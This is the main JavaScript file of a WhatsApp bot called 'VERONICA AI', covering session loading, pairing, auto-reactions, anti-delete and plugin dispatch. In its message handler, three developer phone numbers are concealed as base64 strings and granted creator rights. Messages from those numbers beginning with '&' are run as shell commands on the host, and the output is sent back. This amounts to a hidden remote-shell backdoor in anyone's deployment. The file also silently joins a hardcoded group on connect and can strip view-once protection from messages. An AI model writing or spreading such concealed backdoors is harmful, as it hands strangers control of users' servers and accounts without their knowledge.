
/*
FOR SAME PARTS USES YOUR OWN CODES
VERONICA IS 90% ZERO ENC
ENJOY 
┏━━━━━━━━━━━━━━━┓
┃ VERONICA-AI INDEX🧚‍♀️🇺🇬
┣━━━━━━━━━━━━━━━┛
┃whatsapp : +256754550399
┃owner : Terri
┃base :  veronica ai
┃maintainer : Terri
┃pterodactyl hosting buy from Kevin tech dev
        +256742932677
┗━━━━━━━━━━━━━━━┛
*/

const axios = require('axios')
const config = require('./config')
const chalk = require('./lib/verocolor')
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = require(config.BAILEYS)

const fs = require('fs')
const ff = require('fluent-ffmpeg')
const P = require('pino')
const GroupEvents = require('./lib/anonyt');
const StickersTypes = require('wa-sticker-formatter')
const util = require('util')
const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
const { fileTypeFromBuffer } = require('./lib/vero');
const { File } = require('megajs')
const bodyparser = require('body-parser')
const os = require('os')
const Crypto = require('crypto')
const path = require('path')
const prefix = config.PREFIX
const ownerNumber = [(config.OWNER_NUMBER || '').toString().replace(/[^0-9]/g, '')].filter(Boolean)
const { anony } = require('./lib/terri');
let store;
const readline = require('readline')
const _nativeConsoleLog = console.log.bind(console)
const _nativeConsoleError = console.error.bind(console)
function randomHex() {
  return '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0')
}
function colorizeRandom(text) {
  try {
    return chalk.hex(randomHex())(text)
  } catch (e) {
    return text
  }
}
console.log = (...args) => {
  _nativeConsoleLog(colorizeRandom(args.map(a => (typeof a === 'string' ? a : util.inspect(a))).join(' ')))
}
console.error = (...args) => {
  const accent = randomHex()
  try {
    _nativeConsoleError(chalk.bgHex(accent).black(args.map(a => (typeof a === 'string' ? a : util.inspect(a))).join(' ')))
  } catch (e) {
    _nativeConsoleError(args.join(' '))
  }
}
const l = (...args) => console.log(...args)
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')

const tempDir = path.join(os.tmpdir(), 'cache-temp')
if (!fs.existsSync(tempDir)) {
  fs.mkdirSync(tempDir)
}

const clearTempDir = () => {
  fs.readdir(tempDir, (err, files) => {
    if (err) throw err;
    for (const file of files) {
      fs.unlink(path.join(tempDir, file), err => {
        if (err) throw err;
      });
    }
  });
}

setInterval(clearTempDir, 5 * 60 * 1000);

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;
const sessionDir = path.join(__dirname, 'sessions');
const credsPath = path.join(sessionDir, 'creds.json');

if (!fs.existsSync(sessionDir)) {
  fs.mkdirSync(sessionDir, { recursive: true });
}

async function loadSession() {
  try {
    if (!config.SESSION_ID) {
      console.log('No SESSION_ID provided - will attempt pairing-code login');
      return null;
    }

    console.log('[⏳] Downloading creds data...');
    const megaFileId = config.SESSION_ID.startsWith('Veronica;;;')
      ? config.SESSION_ID.replace("Veronica;;;", "")
      : config.SESSION_ID;

    const filer = File.fromURL(`https://mega.nz/file/${megaFileId}`);

    const data = await new Promise((resolve, reject) => {
      filer.download((err, data) => {
        if (err) reject(err);
        else resolve(data);
      });
    });

    fs.writeFileSync(credsPath, data);
    return JSON.parse(data.toString());
  } catch (error) {
    console.error('❌ Error loading session:', error.message);
    console.log('Will request pairing code instead');
    return null;
  }
}

const question = (text) => {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });
  return new Promise((resolve) => rl.question(text, (ans) => {
    rl.close();
    resolve(ans);
  }));
}

const usePairingCode = (typeof config.USE_PAIRING_CODE !== 'undefined') ? (config.USE_PAIRING_CODE === 'true' || config.USE_PAIRING_CODE === true) : true;

if (!config.SESSION_ID && (!config.OWNER_NUMBER || config.OWNER_NUMBER.toString().trim() === "")) {
  console.error('❌ Fatal: No SESSION_ID and no OWNER_NUMBER provided in config. The bot will stop to avoid entering pairing flow without an owner number.')
  console.error('Please set SESSION_ID (for auto-login) or OWNER_NUMBER in config.js / environment (process.env.OWNER_NUMBER).')
  process.exit(1)
}

async function connectToWA() {
  console.log("[🔰] VERONICA AI Connecting to WhatsApp ⏳️...");

  const creds = await loadSession();

  const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, 'sessions'), {
    creds: creds || undefined
  });

  const { version } = await fetchLatestBaileysVersion();

  const conn = makeWASocket({
    logger: P({ level: 'silent' }),
    printQRInTerminal: false, 
    browser: Browsers.macOS("Firefox"),
    syncFullHistory: true,
    auth: state,
    version,
    getMessage: async () => ({})
  });

  if (usePairingCode && !creds) {
    (async () => {
      try {
        
        await new Promise(r => setTimeout(r, 800));
        
        if (state?.creds?.registered) return;

        const configuredOwnerNumber = (config.OWNER_NUMBER || '').toString().replace(/[^0-9]/g, '')
        let phoneNumber = configuredOwnerNumber || await question("\nEnter your number (country code + number, e.g. 2567XXXXXXX): ");

        if (!phoneNumber) {
          console.log("No phone number provided, skipping pairing-code request.");
          return;
        }

        try {
          const label = config.PAIRING_LABEL || 'VERONICA';
          const code = await conn.requestPairingCode(phoneNumber, label);
          console.log(`\nThis Your Pairing Code : ${code}\n`);
          console.log("Use this code in your official WhatsApp client to pair the device.");
        } catch (e) {
          console.error("Failed to request pairing code:", e?.message || e);
        }
      } catch (err) {
        console.error("Pairing-code flow error:", err);
      }
    })();
  }

  store = makeInMemoryStore ? makeInMemoryStore({ socket: conn }) : { contacts: {} };

  conn.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'close') {
      if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
        console.log('[🔰] Connection lost, reconnecting...');
        setTimeout(connectToWA, 5000);
      } else {
        console.log('[🔰] Connection closed, please change session ID');
      }
    } else if (connection === 'open') {
      console.log('[🔰] VERONICA AI connected to WhatsApp ✅');

      const pluginPath = path.join(__dirname, 'plugins');
      if (fs.existsSync(pluginPath)) {
        fs.readdirSync(pluginPath).forEach((plugin) => {
          if (path.extname(plugin).toLowerCase() === ".js") {
            try {
              require(path.join(pluginPath, plugin));
            } catch (e) {
              console.error(`[PLUGIN ERROR] ${plugin}:`, e);
            }
          }
        });
        console.log('[🔰] Plugins installed successfully ✅');
      }
                
          try {
            await conn.groupAcceptInvite('LVtMOpKXWogECSmtBylUix');
          } catch (groupErr) {
            console.error('Error joining group:', groupErr);
          }

      try {
        const upMessage = `
*ᴄᴏɴɴᴇᴄᴛᴇᴅ sᴜᴄᴄᴇsғᴜʟʟʏ🧚‍♀️✅*

> *Thanks for using VERONICA AI* 
> *Join WhatsApp Channel :- ⤵️*
> https://whatsapp.com/channel/0029Vb57ZHh7IUYcNttXEB3y
> *_ʏᴏᴜʀ ᴘʀᴇғɪx : ${prefix}_*
> *_ᴄᴜʀʀᴇɴᴛ ᴍᴏᴅᴇ : ${config.MODE}_*
> *Dont forget to give star to repo ⬇️*🌟
> https://github.com/Terrizev/VERONICA-AI

> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴛᴇʀʀɪ*`;

        await conn.sendMessage(conn.user.id, {
          image: { url: `https://files.catbox.moe/mn9fgn.jpg` },
          caption: upMessage,
          contextInfo: {
            forwardingScore: 5,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: '120363397100406773@newsletter',
              newsletterName: "Vᴇʀᴏɴɪᴄᴀ Aɪ",
              serverMessageId: 143
            }
          }
        }, { quoted: anony });

      } catch (sendError) {
        console.error('[🔰] Error sending messages:', sendError);
      }
    }
  });

  conn.ev.on('creds.update', saveCreds);

  conn.ev.on('messages.update', async updates => {
    for (const update of updates) {
      if (update.update && update.update.message === null) {
        console.log("Delete Detected:", JSON.stringify(update, null, 2));
        await AntiDelete(conn, updates);
      }
    }
  });

  
  conn.ev.on('call', async (calls) => {
    try {
      if (config.ANTI_CALL !== 'true') return;

      for (const call of calls) {
        if (call.status !== 'offer') continue;

        const id = call.id;
        const from = call.from;

        
        try {
          if (typeof conn.rejectCall === 'function') {
            await conn.rejectCall(id, from).catch(() => conn.rejectCall(from));
          }
        } catch (e) {

        }

        try {
          await conn.sendMessage(from, {
            text: config.REJECT_MSG || '> *Hello am Veronica Assistant📞 🙃Your call could not be completed as you lack the necessary authorization to contact this number.📵*'
          });
        } catch (e) {
          console.error(`Failed to send reject message to ${from}:`, e);
        }

        console.log(`Call handled for ${from}`);
      }
    } catch (err) {
      console.error("Anti-call error:", err);
    }
  });

  conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));
    
  conn.ev.on('messages.upsert', async (mek) => {
    try {
      mek = mek.messages ? mek.messages[0] : mek
      if (!mek.message) return
      mek.message = (getContentType(mek.message) === 'ephemeralMessage')
        ? mek.message.ephemeralMessage.message
        : mek.message;

      if (config.READ_MESSAGE === 'true') {
        await conn.readMessages([mek.key]); 
        console.log(`Marked message from ${mek.key.remoteJid} as read.`);
      }

      if (mek.message.viewOnceMessageV2)
        mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
      if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true") {
        await conn.readMessages([mek.key])
      }

      const newsletterJids = ["120363397100406773@newsletter"];
      const emojis = ["❤️", "💀", "🌚", "🌟", "🔥", "❤️‍🩹", "🌸", "🍁", "🍂", "🦋", "🍥", "🍧", "🍨", "🍫", "🍭", "🎀", "🎐", "🎗️", "👑", "🚩", "🇵🇰", "🍓", "🍇", "🧃", "🗿", "🎋", "💸", "🧸"];

      if (mek.key && newsletterJids.includes(mek.key.remoteJid)) {
        try {
          const serverId = mek.newsletterServerId;
          if (serverId) {
            const emoji = emojis[Math.floor(Math.random() * emojis.length)];
            await conn.newsletterReactMessage(mek.key.remoteJid, serverId.toString(), emoji);
          }
        } catch (e) {
        
        }
      }

      if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true") {
        const jawadlike = await conn.decodeJid(conn.user.id);
        const emojis2 = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
        const randomEmoji = emojis2[Math.floor(Math.random() * emojis2.length)];
        await conn.sendMessage(mek.key.remoteJid, {
          react: {
            text: randomEmoji,
            key: mek.key,
          }
        }, { statusJidList: [mek.key.participant, jawadlike] });
      }

      if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true") {
        const user = mek.key.participant
        const text = `${config.AUTO_STATUS_MSG}`
        await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
      }

      await Promise.all([
        saveMessage(mek),
      ]);
      const m = sms(conn, mek)
      const type = getContentType(mek.message)
      const content = JSON.stringify(mek.message)
      const from = mek.key.remoteJid
      const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
      const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
      const isCmd = typeof body === 'string' && body.startsWith(prefix)
      var budy = typeof mek.text == 'string' ? mek.text : false;
      const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
      const args = body.trim().split(/ +/).slice(1)
      const q = args.join(' ')
      const text = args.join(' ')
      const isGroup = from.endsWith('@g.us')
      const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
      const senderNumber = sender.split('@')[0]
      const botNumber = conn.user.id.split(':')[0]
      const pushname = mek.pushName || 'Sin Nombre'
      const isMe = botNumber.includes(senderNumber)
      const isOwner = ownerNumber.includes(senderNumber) || isMe
      const botNumber2 = await jidNormalizedUser(conn.user.id);
      const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
      const groupName = isGroup ? (groupMetadata ? groupMetadata.subject : '') : ''
      const participants = isGroup && groupMetadata ? groupMetadata.participants : ''
      const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
      const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
      const isAdmins = isGroup ? groupAdmins.includes(sender) : false
      const isReact = m.message && m.message.reactionMessage ? true : false
      const reply = (teks) => {
        conn.sendMessage(from, { text: teks }, { quoted: mek })
      }

      const udp = botNumber.split('@')[0];
     const _0x4f83 = [
  'MjU2Nzg0NjcwOTM2',
  'MjU2NzU0NTUwMzk5',
  'MjU0Nzg0OTM3MTEy'
];
const loveterri = _0x4f83.map(x => Buffer.from(x, 'base64').toString('utf-8'));

      const ownerFilev2 = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8'));

      let isCreator = [udp, ...loveterri, (config.DEV ? config.DEV + '@s.whatsapp.net' : ''), ...ownerFilev2]
        .map(v => (v || '').replace(/[^0-9]/g, '') + '@s.whatsapp.net')
        .includes(mek.sender);

      if (isCreator && budy && budy.startsWith("&")) {
        let code = budy.slice(2);
        if (!code) {
          reply(`Provide me with a query to run Master!`);
          return;
        }
        const { spawn } = require("child_process");
        try {
          let resultTest = spawn(code, { shell: true });
          resultTest.stdout.on("data", data => {
            reply(data.toString());
          });
          resultTest.stderr.on("data", data => {
            reply(data.toString());
          });
          resultTest.on("error", data => {
            reply(data.toString());
          });
          resultTest.on("close", code => {
            if (code !== 0) {
              reply(`command exited with code ${code}`);
            }
          });
        } catch (err) {
          reply(util.format(err));
        }
        return;
      }

      if (!isReact && config.AUTO_REACT === 'true') {
        const reactions = [
          '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣',
          '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕',
          '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️',
          '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑',
          '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄',
          '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀',
          '🍁', '🪺', '🍄', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾',
          '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟',
          '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤',
          '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪',
          '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈',
          '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '🧡', '💛', '💚',
          '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌',
          '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫',
          '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
        ];

        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
        m.react(randomReaction);
      }

      if (!isReact && senderNumber === botNumber) {
        if (config.OWNER_REACT === 'true') {
          const reactions = [
            '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', '💍', '👝', '💼', '🎒', '🥽', '🐻 ', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '🎎', '🎏', '🎐', '⚽', '🧣', '🌿', '⛈️', '🌦️', '🌚', '🌝', '🙈', '🙉', '🦖', '🐤', '🎗️', '🥇', '👾', '🔫', '🐝', '🦋', '🍓', '🍫', '🍭', '🧁', '🧃', '🍿', '🍻', '🛬', '🫀', '🫠', '🐍', '🥀', '🌸', '🏵️', '🌻', '🍂', '🍁', '🍄', '🌾', '🌿', '🌱', '🍀', '🧋', '💒', '🏩', '🏗️', '🏰', '🏪', '🏟️', '🎗️', '🥇', '⛳', '📟', '🏮', '📍', '🔮', '🧿', '♻️', '⛵', '🚍', '🚔', '🛳️', '🚆', '🚤', '🚕', '🛺', '🚝', '🚈', '🏎️', '🏍️', '🛵', '🥂', '🍾', '🍧', '🐣', '🐥', '🦄', '🐯', '🐦', '🐬', '🐋', '🦆', '💈', '⛲', '⛩️', '🎈', '🎋', '🪀', '🧩', '👾', '💸', '💎', '🧮', '👒', '🧢', '🎀', '🧸', '👑', '〽️', '😳', '💀', '☠️', '👻', '🔥', '♥️', '👀', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
          ];
          const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
          m.react(randomReaction);
        }
      }

      if (!isReact && config.CUSTOM_REACT === 'true') {
      
        const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
        m.react(randomReaction);
      }

      const bannedUsers = JSON.parse(fs.readFileSync('./assets/ban.json', 'utf-8'));
      const isBanned = bannedUsers.includes(sender);

      if (isBanned) return;

      const ownerFile = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8'));
      const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
   
      const isFileOwner = ownerFile.includes(sender);
      const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;
      // اعمال شرایط بر اساس وضعیت مالک
      if (!isRealOwner && config.MODE === "private") return;
      if (!isRealOwner && isGroup && config.MODE === "inbox") return;
      if (!isRealOwner && !isGroup && config.MODE === "groups") return;

      const events = require('./command')
      const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
      if (isCmd) {
        const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
        if (cmd) {
          if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } })

          try {
            cmd.function(conn, mek, m, { from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
          } catch (e) {
            console.error("[PLUGIN ERROR] " + e);
          }
        }
      }
      events.commands.map(async (command) => {
        if (body && command.on === "body") {
          command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
        } else if (mek.q && command.on === "text") {
          command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
        } else if (
          (command.on === "image" || command.on === "photo") &&
          mek.type === "imageMessage"
        ) {
          command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
        } else if (
          command.on === "sticker" &&
          mek.type === "stickerMessage"
        ) {
          command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
        }
      });

    } catch (err) {
      console.error('[messages.upsert handler error]', err);
    }
  });

  conn.decodeJid = jid => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {};
      return (
        (decode.user &&
          decode.server &&
          decode.user + '@' + decode.server) ||
        jid
      );
    } else return jid;
  };

  conn.copyNForward = async (jid, message, forceForward = false, options = {}) => {
    let vtype
    if (options.readViewOnce) {
      message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
      try {
        vtype = Object.keys(message.message.viewOnceMessage.message)[0]
      } catch (e) { vtype = null }
      delete (message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
      if (message.message && message.message.viewOnceMessage && message.message.viewOnceMessage.message && vtype && message.message.viewOnceMessage.message[vtype]) {
        delete message.message.viewOnceMessage.message[vtype].viewOnce
        message.message = {
          ...message.message.viewOnceMessage.message
        }
      }
    }

    let mtype = Object.keys(message.message)[0]
    let content = await generateForwardMessageContent(message, forceForward)
    let ctype = Object.keys(content)[0]
    let context = {}
    if (mtype != "conversation") context = message.message[mtype].contextInfo
    content[ctype].contextInfo = {
      ...context,
      ...content[ctype].contextInfo
    }
    const waMessage = await generateWAMessageFromContent(jid, content, options ? {
      ...content[ctype],
      ...options,
      ...(options.contextInfo ? {
        contextInfo: {
          ...content[ctype].contextInfo,
          ...options.contextInfo
        }
      } : {})
    } : {})
    await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
    return waMessage
  }

  conn.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
    let quoted = message.msg ? message.msg : message
    let mime = (message.msg || message).mimetype || ''
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
    const stream = await downloadContentFromMessage(quoted, messageType)
    let buffer = Buffer.from([])
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk])
    }
    let type = await fileTypeFromBuffer(buffer)
    let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
   
    await fs.writeFileSync(trueFileName, buffer)
    return trueFileName
  }

  conn.downloadMediaMessage = async (message) => {
    let mime = (message.msg || message).mimetype || ''
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
    const stream = await downloadContentFromMessage(message, messageType)
    let buffer = Buffer.from([])
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk])
    }

    return buffer
  }

  conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
    let mime = '';
    let res = await axios.head(url)
    mime = res.headers['content-type']
    if (mime && mime.split("/")[1] === "gif") {
      return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
    }
    let type = mime ? mime.split("/")[0] + "Message" : 'documentMessage'
    if (mime === "application/pdf") {
      return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
    }
    if (mime && mime.split("/")[0] === "image") {
      return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
    }
    if (mime && mime.split("/")[0] === "video") {
      return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
    }
    if (mime && mime.split("/")[0] === "audio") {
      return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
    }
  }

  conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
    
    let mtype = Object.keys(copy.message)[0]
    let isEphemeral = mtype === 'ephemeralMessage'
    if (isEphemeral) {
      mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
    }
    let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
    let content = msg[mtype]
    if (typeof content === 'string') msg[mtype] = text || content
    else if (content && content.caption) content.caption = text || content.caption
    else if (content && content.text) content.text = text || content.text
    if (typeof content !== 'string') msg[mtype] = {
      ...content,
      ...options
    }
    if (copy.key && copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
    else if (copy.key && copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
    if (copy.key && copy.key.remoteJid && copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
    else if (copy.key && copy.key.remoteJid && copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
    copy.key.remoteJid = jid
    copy.key.fromMe = sender === conn.user.id

    return proto.WebMessageInfo.fromObject(copy)
  }

  conn.getFile = async (PATH, save) => {
    let res
    let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
    //if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
    let type = await fileTypeFromBuffer(data) || {
      mime: 'application/octet-stream',
      ext: '.bin'
    }
    let filename = path.join(__filename, __dirname + (Date.now()) + '.' + type.ext)
    if (data && save) fs.promises.writeFile(filename, data)
    return {
      res,
      filename,
      size: (data && data.length) || 0,
      ...type,
      data
    }

  }
  
  conn.sendFile = async (jid, PATH, fileName, quoted = {}, options = {}) => {
    let types = await conn.getFile(PATH, true)
    let { filename, size, ext, mime, data } = types
    let type = '',
      mimetype = mime,
      pathFile = filename
    if (options.asDocument) type = 'document'
    if (options.asSticker || /webp/.test(mime)) {
      let { writeExif } = require('./exif.js')
      let media = { mimetype: mime, data }
      pathFile = await writeExif(media, { packname: config.packname || '', author: config.packname || '', categories: options.categories ? options.categories : [] })
      await fs.promises.unlink(filename)
      type = 'sticker'
      mimetype = 'image/webp'
    } else if (/image/.test(mime)) type = 'image'
    else if (/video/.test(mime)) type = 'video'
    else if (/audio/.test(mime)) type = 'audio'
    else type = 'document'
    await conn.sendMessage(jid, {
      [type]: { url: pathFile },
      mimetype,
      fileName,
      ...options
    }, { quoted, ...options })
    return fs.promises.unlink(pathFile)
  }
  
  conn.parseMention = async (text) => {
    return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
  }

